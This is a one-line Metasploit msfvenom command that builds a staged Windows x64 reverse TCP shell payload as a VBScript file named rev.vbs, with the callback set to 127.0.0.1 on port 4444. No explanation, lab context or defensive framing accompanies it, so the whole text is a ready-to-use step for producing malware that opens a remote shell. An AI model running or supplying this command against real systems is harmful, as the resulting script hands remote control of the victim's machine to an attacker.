msfvenom -p windows/x64/shell/reverse_tcp -f vbs LHOST=127.0.0.1 LPORT=4444 -o rev.vbs
